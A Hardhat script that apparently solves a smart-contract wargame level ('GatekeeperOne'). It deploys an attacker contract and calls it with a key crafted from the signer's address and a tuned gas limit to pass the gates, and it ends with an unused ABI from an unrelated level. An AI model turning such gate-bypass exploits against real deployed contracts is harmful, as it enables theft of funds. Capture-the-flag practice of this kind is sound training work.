// Runtime Environment's members available in the global scope.
import { ethers } from 'hardhat';
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";


async function main() {
  const instanceAddress = "0x9b46Fd46376e3D5606E0bb8Ac8f482090dBDC1C9";
  const signer = getSigner();
  const Gater = await ethers.getContractFactory("GatekeeperOne");  
  const gate = await Gater.connect(signer).attach(instanceAddress);
  await gate.deployed();
  // await gate.reset();
  console.log("current holder:", await gate.entrant());


  const Attacker = await ethers.getContractFactory("GateOneAttacker");
  const attacker = await Attacker.deploy(instanceAddress);
  await attacker.deployed();


  const addressOwner = await signer.getAddress();
  const hexData = "0x12345678" + "0000" + addressOwner.substring(addressOwner.length - 4, addressOwner.length);
  console.log(hexData);

  const gasToUse = 825530
  const gas = gasToUse;
  try {
    await (await attacker.tryEnter(hexData, { gasLimit: gas })).wait();
  }
  catch (e) {
    console.log(e);
  }
  // }

  console.log("current holder:", await gate.entrant());
  

}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [
  {
    "inputs": [
      {
        "internalType": "bytes32[3]",
        "name": "_data",
        "type": "bytes32[3]"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ID",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xb3cea217"
  },
  {
    "inputs": [],
    "name": "locked",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xcf309012"
  },
  {
    "inputs": [
      {
        "internalType": "bytes16",
        "name": "_key",
        "type": "bytes16"
      }
    ],
    "name": "unlock",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xe1afb08c"
  }
]